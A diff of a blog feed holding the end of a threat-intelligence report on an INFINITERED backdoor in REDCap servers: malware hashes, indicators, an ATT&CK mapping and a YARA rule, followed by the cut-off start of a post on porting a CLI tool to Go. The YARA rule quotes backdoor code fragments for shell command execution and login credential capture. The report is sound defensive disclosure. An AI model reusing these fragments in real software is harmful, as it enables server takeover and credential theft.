+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;SHA256&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Persistence (help.php)&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;ba6b73b0ca0dc7f86b3b397893ac32d729fd53f9df20643288f141f29d020af7&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Credential Harvester &lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;db65c1b9f9e4cb4d729f45ad4b6fcf3e277caf9eb4c875425dec93fd883f9136&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Credential Harvester &lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;c1ac43d23f89d41eb4ff131678ab562ab2cfed9aa334b13767ef141d303b0e5b&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Backdoor &lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;8f0158855a656b629ca76ebca565f18bc25563ded34b65d6771632c20edb68ec&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Backdoor &lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;51a57bfc9ed3eb6451c1c289607814d59e1698c666fb97ac5f694c398f23d045&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Dropper &lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;4efbef69eb3b09bacff892d6a55778d07c418e7f15eba3cf1245e8cdfd8dda0b&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Dropper &lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;58bb25777e0aa86bcd2125101e0bca4e8732b03d91bd8d2f205b446a2a8d5c86&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Host Indicators&lt;/span&gt;&lt;/h4&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;div align="left"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;&lt;table border="1px" cellpadding="16px" style="border-collapse: collapse; width: 100%;"&gt;&lt;colgroup&gt;&lt;col /&gt;&lt;col /&gt;&lt;/colgroup&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Indicator&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Description&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;b49e334d-9c01-463e-9bc5-00a6920fb66e&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;INFINITERED current software version GUID delimiter&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;xc32038474a&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;INFINITERED Redcap database session ID prefix&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;strong style="vertical-align: baseline;"&gt;MITRE ATT&amp;amp;CK Mapping&lt;/strong&gt;&lt;/h3&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;div align="left"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;&lt;table&gt;&lt;colgroup&gt;&lt;col /&gt;&lt;col /&gt;&lt;col /&gt;&lt;col /&gt;&lt;/colgroup&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Tactic&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Technique ID&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Technique Name&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Context/Activity&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Initial Access&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1190&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Exploit Public-Facing Application&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Exploitation of REDCap survey management servers.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Persistence&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1505.003&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Server Software Component: Web Shell&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Deployment of INFINITERED and uploaders.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt; &lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1554&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Compromise Client Software Binary&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Modification of REDCap to intercept updates.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Defense Evasion&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1027&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Obfuscated Files or Information&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Use of Base64 encoding for malicious payloads within PHP files.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt; &lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1090.003&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Proxy: Multi-hop Proxy&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Routing traffic through compromised IoT devices (OBF networks).&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt; &lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1562.001&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Impair Defenses: Disable or Modify Tools&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Creating "silent" BCC rules to avoid user detection.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt; &lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1689&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Downgrade Attack&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Exploiting vulnerable legacy versions of REDCap.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Credential Access&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1555&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Credentials from Password Stores&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Accessing local configuration files. &lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt; &lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1056.003&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Input Capture: Web Portal Capture&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;INFINITERED harvesting plaintext credentials from POST login requests.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Collection&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1114.003&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Email Collection: Email Forwarding Rule&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Use of content compliance rules ("Patroit") for automated exfiltration.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt; &lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1213&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Data from Information Repositories&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Searching storage and email for strategic keywords.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Command and Control&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1071.001&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Application Layer Protocol: Web Protocols&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;C2 communication via HTTP Cookie parameters (REDCAP-TOKEN).&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Exfiltration&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1567&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Exfiltration Over Web Service&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Silently forwarding sensitive data to actor-controlled Gmail addresses.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt; &lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1071.001&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Application Layer Protocol: Web Protocols&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;HTTP response to C2 commands&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;Detections&lt;/h3&gt;
+&lt;h4&gt;YARA Rules&lt;/h4&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;rule G_Backdoor_INFINITERED_1 {
+	meta:
+		author = "Google Threat Intelligence Group (GTIG)"
+	strings:
+		$magic_flag = "ej671a16i7fd8202nu6ltfg5p6x7u"
+		$magic_flag_base64 = "ej671a16i7fd8202nu6ltfg5p6x7u" base64
+		$marker = "b49e334d-9c01-463e-9bc5-00a6920fb66e"
+		$marker_base64 = "YjQ5ZTMzNGQtOWMwMS00NjNlLTliYzUtMDBhNjkyMGZiNjZl"
+		$s1 = "substr($cookieValue, strlen($magic_flag));"
+		$s2 = "getcwd(), php_uname(), phpversion(), $_SERVER['SERVER_SOFTWARE']"
+		$s3 = "'data' =&amp;gt; encrypt($data, $key)"
+		$s4 = "$data = shell_exec($command);"
+		$s5 = "move_uploaded_file($tmpPath, $fileName)"
+		$s6 = "$data = implode('|', $fields)"
+		$b_s1 = "substr($cookieValue, strlen($magic_flag));" base64
+		$b_s2 = "getcwd(), php_uname(), phpversion(), $_SERVER['SERVER_SOFTWARE']" base64
+		$b_s3 = "'data' =&amp;gt; encrypt($data, $key)" base64
+		$b_s4 = "$data = shell_exec($command);" base64
+		$b_s5 = "move_uploaded_file($tmpPath, $fileName)" base64
+		$b_s6 = "$data = implode('|', $fields)" base64
+		$t1 = "(isset($_POST['username']) &amp;amp;&amp;amp; $_POST['password'])"
+		$t2 = "INSERT INTO redcap_sessions (session_id, session_data, session_expiration) VALUES ('$session_id', '$str', FROM_UNIXTIME($expiration_timestamp))"
+		$t3 = "encrypt($currentUTC . '[::]' . $_POST['username'] . '[::]' . $_POST['password']);"
+		$t4 = "redcap_connect.php"
+		$b_t1 = "(isset($_POST['username']) &amp;amp;&amp;amp; $_POST['password'])" base64
+		$b_t2 = "INSERT INTO redcap_sessions (session_id, session_data, session_expiration) VALUES ('$session_id', '$str', FROM_UNIXTIME($expiration_timestamp))" base64
+		$b_t3 = "encrypt($currentUTC . '[::]' . $_POST['username'] . '[::]' . $_POST['password']);" base64
+		$b_t4 = "redcap_connect.php" base64
+		$u1 = "$zip-&amp;gt;open($filename) === TRUE)"
+		$u2 = "$hooks_encode ="
+		$u3 = "$auth_encode ="
+		$u4 = "$file_content_hooks = $zip-&amp;gt;getFromName($file_hooks);"
+		$u5 = "$file_content_auth = $zip-&amp;gt;getFromName($file_auth);"
+		$u6 = "$file_content_upgrade = $zip-&amp;gt;getFromName($file_upgrade);"
+		$u7 = "str_replace($search_content, $hooks_decode, $file_content_hooks);"
+		$u8 = "str_replace($search_content, $upgrade_decode, $file_content_upgrade);"
+		$u9 = "str_replace($search_content, $auth_decode, $file_content_auth);"
+		$b_u1 = "$zip-&amp;gt;open($filename) === TRUE)" base64
+		$b_u2 = "$hooks_encode =" base64
+		$b_u3 = "$auth_encode =" base64
+		$b_u4 = "$file_content_hooks = $zip-&amp;gt;getFromName($file_hooks);" base64
+		$b_u5 = "$file_content_auth = $zip-&amp;gt;getFromName($file_auth);" base64
+		$b_u6 = "$file_content_upgrade = $zip-&amp;gt;getFromName($file_upgrade);" base64
+		$b_u7 = "str_replace($search_content, $hooks_decode, $file_content_hooks);" base64
+		$b_u8 = "str_replace($search_content, $upgrade_decode, $file_content_upgrade);" base64
+		$b_u9 = "str_replace($search_content, $auth_decode, $file_content_auth);" base64
+		$filemarker = "&amp;lt;?php"
+	condition:
+		filesize &amp;lt; 1MB and $filemarker in (0 .. 128) and (((any of ($magic*) or any of ($marker*)) and (any of ($s*) or any of ($t*) or any of ($u*))) or 4 of ($s*) or 4 of ($b_s*) or all of ($t*) or all of ($b_t*) or 6 of ($u*) or 6 of ($b_u*))
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+    <link href="https://cloud.google.com/blog/topics/threat-intelligence/prc-targets-us-medical-research/"/>
+    <category term="Google Cloud"/>
+    <published>2026-06-15T14:00:00+00:00</published>
+  </entry>
+  <entry>
+    <id>https://cloud.google.com/blog/topics/developers-practitioners/how-i-learned-go-in-a-day-with-antigravity-20-and-how-you-can-do-the-same/</id>
+    <title>How I learned Go in a Day with Antigravity 2.0 and How You Can Do the Same</title>
+    <updated>2026-06-15T09:29:00+00:00</updated>
+    <content type="html">&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;I have been exploring how&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; to reclaim my software stack from NPM dependency overhead and replace my resource-intensive Node.js runtime with a compiled, single-binary Go CLI. The result of my efforts is &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;skl&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, a fast tool we use for managing Agent Skills, that launches in 2ms and uses only 11MB of memory.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;But how exactly did I do it?&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Simply, I set the architectural goals and audited the logic, while Antigravity handled the mechanical work of code translation, test generation, and platform path mappings for us. This post describes the step-by-step walkthrough of our migration workflow to help you build yours.&lt;/span&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;span style="vertical-align: baseline;"&gt;Step 0: Seed personal learning goals&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Before writing any code, you start by defining the boundaries of your project. In our case, I wanted a zero-dependency core that used minimal external packages. I decided that our CLI tool needs to be fast, and our security model had to be zero-trust wherever appropriate. In the process, my agent added specific constraints: sanitizing all of our inputs, blocking path traversals, and enforcing depth limits on our folder scans to prevent CPU hangs.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;I began by prompting Gemini to audit alternative stacks and help us weigh their tradeoffs.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;Research online and identify 3-5 CLI tool building alternatives to use over TS and explain why (focus on performance and security) with specific example and links&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be76ba220&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Here are some alternatives we considered:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
